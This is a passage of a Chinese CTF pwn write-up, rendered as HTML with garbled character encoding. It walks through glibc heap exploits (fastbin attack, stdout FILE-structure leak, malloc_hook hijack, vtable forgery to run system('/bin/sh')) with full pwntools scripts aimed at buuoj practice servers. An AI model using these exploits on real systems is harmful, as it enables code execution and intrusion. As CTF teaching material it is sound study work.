src="/../img/2706180-20220826111117610-1516022746.png"></p><h4 id="å°†unsorted-binä¸­çš„å †å—æ”¾å…¥fastbinä¸­"><a href="#å°†unsorted-binä¸­çš„å †å—æ”¾å…¥fastbinä¸­" class="headerlink" title="å°†unsorted binä¸­çš„å †å—æ”¾å…¥fastbinä¸­"></a>å°†unsorted binä¸­çš„å †å—æ”¾å…¥fastbinä¸­</h4><p>å› ä¸ºéœ€è¦æ‰“fastbin attackå°†main_arena+88è¿™ä¸ªåœ°å€è¿›è¡Œç¯¡æ”¹ï¼Œæ‰€ä»¥è¦å…ˆæŠŠunsorted binä¸­çš„å †å—æ”¾å…¥fastbinä¸­ï¼Œæƒ³å®ç°è¿™ä¸ªçš„è¯ï¼Œè¿˜æ˜¯ç”¨fastbin attackè¿›è¡Œæ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)#å°†å¤§å †å—é‡Šæ”¾ï¼Œä½¿å…¶è¿›å…¥unsorted binä¸­</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)#å°†unsorted binä¸­çš„å †å—ç¯¡æ”¹åˆ°fast binä¸Š</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å®ç°å°†unsorted binä¸­çš„å †å—æ”¾å…¥fast binä¸­ã€‚</p><p>ä¸‹å›¾ä¸ºä¿®æ”¹å‰çš„binsæƒ…å†µ<br><img src="/../img/2706180-20220826111157348-1189507279.png"></p><p>ä¸‹å›¾ä¸ºä¿®æ”¹åçš„binsæƒ…å†µ</p><p><img src="/../img/2706180-20220826111208472-424079904.png"></p><h4 id="çˆ†ç ´ä¸€æ¯”ç‰¹ä½ï¼Œå°†fake-chunkç”³è¯·åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹"><a href="#çˆ†ç ´ä¸€æ¯”ç‰¹ä½ï¼Œå°†fake-chunkç”³è¯·åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹" class="headerlink" title="çˆ†ç ´ä¸€æ¯”ç‰¹ä½ï¼Œå°†fake_chunkç”³è¯·åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹"></a>çˆ†ç ´ä¸€æ¯”ç‰¹ä½ï¼Œå°†fake_chunkç”³è¯·åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹</h4><p>ç”±äºæˆ‘ä»¬çš„fake_chunkè¿›å…¥äº†fast binä¸­ï¼Œä½†æ˜¯å…¶sizeæ˜¯ä¹‹å‰è¢«ä¼ªé€ è¿‡çš„0xe1ï¼Œè¦æƒ³ä»fastbinä¸­å†ç”³è¯·å‡ºæ¥è¿˜éœ€è¦å†æ”¹å›å»ã€‚åŒæ—¶éœ€è¦æ‰“fastbin attackå°†fake_chunkç”³è¯·åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹ï¼Œè¿™ä¸ªåœ°å€æ˜¯åœ¨&amp;_IO_2_1_stdout_-0x43çš„ä½ç½®ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ°å€æ˜¯0x7få¼€å¤´ï¼ŒåŒæ—¶ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒä¸º0çš„åœ°å€ã€‚</p><p>å¦‚ä¸‹å›¾è¿™é‡Œå°±æ˜¯ç¬¦åˆæ¡ä»¶çš„åœ°æ–¹ï¼š</p><p><img src="/../img/2706180-20220826111255470-1590182798.png"></p><p>ç»è¿‡è®¡ç®—å‘ç°è¯¥stdoutç»“æ„ä½“åœ°å€-0x43çš„ä½ç½®æˆåŠŸä¼ªé€ äº†size</p><p><img src="/../img/2706180-20220826111308632-2123238392.png"></p><p>è€Œè¿™ä¸ªåœ°å€çš„åä¸‰ä½æ˜¯å›ºå®šçš„ï¼Œå€’æ•°ç¬¬å››ä½æ˜¯éšæœºçš„ ï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½å†™ä¸¤å­—èŠ‚å› æ­¤ç¬¬å››ä½å¿…é¡»è¦å»çˆ†ç ´ã€‚(åœ¨è°ƒè¯•çš„æ—¶å€™å…³é—­ASLRå°±æ— éœ€çˆ†ç ´äº†ï¼Œç­‰è„šæœ¬å†™å®Œäº†å†å»å†™çˆ†ç ´éƒ¨åˆ†)</p><p>ç„¶åfake_chunkç”³è¯·åˆ°stdoutç»“æ„ä½“ä¸Šæ–¹åï¼Œæˆ‘ä»¬å»æ”¹å˜ç»“æ„ä½“çš„_flagså­—æ®µå’Œ_IO_write_baseå­—æ®µ(å…·ä½“åŸç†çš„è¯å¯ä»¥çœ‹è¿™ç¯‡<a href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">æ–‡ç« </a>)ï¼Œç­‰å†æ¬¡è°ƒç”¨putså‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–libcåŸºåœ°å€äº†ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯å°†_flagså­—æ®µæ”¹æˆ0xfbad1880ï¼Œä¹‹åçš„putséƒ½ä¸ä¼šå†åŠ \näº†ï¼Œå› æ­¤è¦å¤„ç†ä¸€ä¸‹æ¥æ”¶éƒ¨åˆ†ã€‚ä¸è¿‡ç”¨0xfbad1887å°±æ˜¯æ­£å¸¸çš„ï¼‰ã€‚</p><p>è¿™éƒ¨åˆ†expä¸­çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#ä¼ªé€ 0x71çš„sizeï¼Œä½¿å…¶é€šè¿‡fast binçš„æ£€æŸ¥,ä¼ªé€ fake chunkåˆ°stdoutç»“æ„ä½“ä¸Šæ–¹(éœ€è¦çˆ†ç ´ä¸€ä½)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å°†fastbinä¸­çš„å †å—ç”³è¯·å‡ºå»ï¼Œæ‰“fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#ç¯¡æ”¹ç»“æ„ä½“ä¸­çš„å­—æ®µ</span></span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="åŠ«æŒmalloc-hook"><a href="#åŠ«æŒmalloc-hook" class="headerlink" title="åŠ«æŒmalloc_hook"></a>åŠ«æŒmalloc_hook</h4><p>æœ‰äº†libcåŸºåœ°å€ï¼Œè¿˜å¯ä»¥æ‰“fastbin attackçš„è¯ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªå¸¸è§„çš„åŠ«æŒmalloc_hookäº†ï¼Œå°±åˆ©ç”¨malloc_hook-0x23é‚£ä¸ªä½ç½®å­˜åœ¨çš„0x7fæ¥ä¼ªé€ æˆsizeå°†malloc_hookç”³è¯·å‡ºæ¥ï¼Œç„¶åè¿™é“é¢˜çš„è¯one_gadgetä¹Ÿéƒ½ä¸é€šï¼Œéœ€è¦ç”¨reallocå‡½æ•°æ¥è°ƒæ•´ä¸€ä¸‹æ ˆå¸§ã€‚</p><p>è¿™éƒ¨åˆ†expå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>ç”±äºè¿™é“é¢˜éœ€è¦çˆ†ç ´ä¸€æ¯”ç‰¹ä½ï¼Œå› æ­¤æˆ‘ä»¬æœ€ç»ˆè¿˜æœ‰å†åŠ ä¸€ä¸ªçˆ†ç ´éƒ¨åˆ†ã€‚æœ€ç»ˆçš„expå¦‚ä¸‹ï¼š<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28187)</span></span><br><span class="line">d_a=<span class="number">0xEAE</span></span><br><span class="line">d_d=<span class="number">0xec0</span></span><br><span class="line">d_e=<span class="number">0xed2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#å°†å¤§å †å—é‡Šæ”¾ï¼Œä½¿å…¶è¿›å…¥unsorted binä¸­</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)<span class="comment">#å°†unsorted binä¸­çš„å †å—ç¯¡æ”¹åˆ°fast binä¸Š</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#ä¼ªé€ 0x71çš„sizeï¼Œä½¿å…¶é€šè¿‡fast binçš„æ£€æŸ¥,ä¼ªé€ fake chunkåˆ°stdoutç»“æ„ä½“ä¸Šæ–¹(éœ€è¦çˆ†ç ´ä¸€ä½)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å°†fastbinä¸­çš„å †å—ç”³è¯·å‡ºå»ï¼Œæ‰“fastbin attack</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5600</span></span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_a,d_d,d_e)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29923</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220826111332346-148506803.png"></p><h2 id="nsctf-online-2019-pwn1"><a href="#nsctf-online-2019-pwn1" class="headerlink" title="nsctf_online_2019_pwn1"></a>nsctf_online_2019_pwn1</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ€»ç»“æœ‰ï¼š</p><p>1ã€ç¯¡æ”¹_IO_FILEç»“æ„ä½“ä¸­çš„vtableå­—æ®µæ—¶ï¼Œè¦ä¸å¯é¿å…çš„å¡«å……ä¹‹å‰çš„å­—æ®µï¼Œä½†å¦‚æœå°†_lockå­—æ®µç ´åçš„è¯ï¼Œåœ¨æ‰§è¡Œè¾“å‡ºå‡½æ•°ä¸­æœ€å¼€å§‹ä¸Šé”çš„å®<code>_IO_acquire_lock (_IO_stdout)</code>å°±ä¼šå´©æºƒæ‰ï¼Œå› æ­¤éœ€è¦ä¿è¯_lockå­—æ®µæ˜¯æ­£å¸¸çš„ã€‚</p><p>2ã€å¦‚æœæƒ³é€šè¿‡ç›´æ¥ä¿®æ”¹_IO_2_1_stdout_ç»“æ„ä½“ä¸­çš„å­—æ®µæ¥è·å–shellçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å°†_flagså­—æ®µå†™å…¥å­—ç¬¦ä¸²&#x2F;bin&#x2F;sh\x00(æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¶éè¯¥å­—ç¬¦ä¸²çš„åœ°å€)ï¼Œç„¶åå°†vtableä¿®æ”¹ä¸º_IO_2_1_stdout_çš„åœ°å€+0x10ï¼Œç„¶åå°†_IO_save_baseå­—æ®µå†™æˆsystemåœ°å€ï¼Œæœ€åè¦å°†_lockå­—æ®µå†™å…¥åŸæœ¬æ­£å¸¸çš„å€¼ã€‚è¿™æ ·å½“æ‰§è¡Œputså‡½æ•°çš„æ—¶å€™ä¼šè°ƒç”¨vtableä¸­çš„_IO_new_file_xsputnå‡½æ•°ï¼Œä½†æ˜¯vtableå·²ç»è¢«ä¿®æ”¹ï¼Œè¿™ä¸ªå‡½æ•°çš„åç§»æ˜¯0x38,è€Œvtableè¢«ä¿®æ”¹æˆ_IO_2_1_stdout_çš„åœ°å€+0x10,æœ€ç»ˆè°ƒç”¨çš„æ˜¯_IO_2_1_stdout_çš„åœ°å€+0x48çš„å‡½æ•°æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªä½ç½®å°±æ˜¯_IO_save_baseå­—æ®µï¼Œé‡Œé¢æ”¾çš„æ˜¯systemçš„åœ°å€ã€‚è€Œ_IO_new_file_xsputnå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯_IO_2_1_stdout_çš„åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€åŸæœ¬åº”è¯¥æ˜¯_flagså­—æ®µï¼Œä½†æ˜¯ç°åœ¨å´è¢«å†™å…¥äº†&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ã€‚å› æ­¤æœ¬æ¥æ­£å¸¸è°ƒç”¨çš„_IO_new_file_xsputnå‡½æ•°å¦‚ä»Šå˜æˆäº†system(â€˜&#x2F;bin&#x2F;sh\x00â€™),ä»è€Œè·å–shellã€‚(è¯¥æ–¹æ³•åªèƒ½åœ¨libc2.23ä»¥ä¸Šçš„ç‰ˆæœ¬å°±æ— æ³•å†ä½¿ç”¨äº†)</p><p>3ã€<strong>åªæœ‰off by nullæ¼æ´çš„è¯ï¼Œæƒ³éœ€è¦å°†unsorted binä¸­çš„fdæ”¾åˆ°fastbinçš„fdä¸Šï¼Œéœ€è¦æ‰“ä¸¤æ¬¡off by null+å †å—é‡å ï¼Œå¹¶ä¸”æœ€åå°†å…¶ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œéœ€è¦ç¯¡æ”¹ä¸€ä¸‹sizeçš„å¤§å°ã€‚</strong></p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/2706180-20220826111350808-1322092443.png"></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ:"></a>æ¼æ´åˆ†æ:</h3><p>é¦–å…ˆåœ¨editå‡½æ•°ä¸­ï¼Œè¾“å…¥ç´¢å¼•çš„éƒ¨åˆ†ï¼Œæ£€æŸ¥ä¸å®Œå…¨ï¼Œå¯¼è‡´äº†è¿™ä¸ªç´¢å¼•æ˜¯å¯ä»¥ä¸ºè´Ÿæº¢å‡ºçš„ã€‚</p><p><img src="/../img/2706180-20220826111401744-135014955.png"></p><p>ç„¶ååœ¨editå‡½æ•°å†™å…¥æ•°æ®çš„åœ°æ–¹ï¼Œå¦‚æœaddåˆ›å»ºæ—¶çš„å¤§å°ç­‰äºeditæ—¶è¾“å…¥çš„å¤§å°ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€ä¸ªoff by nullæ¼æ´ã€‚</p><p><img src="/../img/2706180-20220826111445836-811184644.png"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><h4 id="æ€è·¯ä¸€ï¼šåˆ©ç”¨ç´¢å¼•ä¸ºè´Ÿï¼Œæº¢å‡ºæ¼æ´"><a href="#æ€è·¯ä¸€ï¼šåˆ©ç”¨ç´¢å¼•ä¸ºè´Ÿï¼Œæº¢å‡ºæ¼æ´" class="headerlink" title="æ€è·¯ä¸€ï¼šåˆ©ç”¨ç´¢å¼•ä¸ºè´Ÿï¼Œæº¢å‡ºæ¼æ´"></a>æ€è·¯ä¸€ï¼šåˆ©ç”¨ç´¢å¼•ä¸ºè´Ÿï¼Œæº¢å‡ºæ¼æ´</h4><p><img src="/../img/2706180-20220826111507589-1206383168.png"></p><p>æˆ‘ä»¬å‘ç°æ•°ç»„çš„ç´¢å¼•ä¸ºè´Ÿæ•°ï¼Œæ˜¯å¯ä»¥æ‰¾åˆ°bssæ®µå­˜æ”¾çš„stdoutæŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆå­˜æ”¾çš„æ˜¯_IO_2_1_stdout_ç»“æ„ä½“æŒ‡é’ˆï¼Œå¦‚æœreadå¾€é‡Œé¢å†™æ•°æ®çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥ç¯¡æ”¹_IO_2_1_stdout_ç»“æ„ä½“çš„å„ä¸ªå­—æ®µã€‚</p><p>é€šè¿‡è¿™ä¸ªæ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“ä¸€ä¸ªio leakï¼Œæ³„éœ²libcåœ°å€ï¼Œç„¶åå†ç¯¡æ”¹_flagsã€_lockã€vtableã€_IO_save_baseå­—æ®µï¼Œæœ€ç»ˆåŠ«æŒvtableä¸­çš„_IO_new_file_xsputnå‡½æ•°ä¸ºsystemå‡½æ•°ï¼Œæ‰§è¡Œè·å–shellã€‚</p><p>è¿™æ¬¡è·Ÿç€<a href="https://www.cnblogs.com/LynneHuan/p/15229822.html">roderickå¸ˆå‚…çš„åšå®¢</a>å­¦åˆ°äº†è¿™ä¸ªFileStructure()çš„ç”¨æ³•ï¼Œæ„Ÿè§‰è›®æ–¹ä¾¿çš„ã€‚<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27580</span>)</span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Add success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>//æ”¹æˆ<span class="number">0xfbad1887</span>çš„è¯,putså‡½æ•°æ‰“å°å‡ºæ¥çš„æ•°æ®åé¢ä¾ç„¶æœ‰\n</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xe34)</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c36e0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=libc_base+libc.symbols[<span 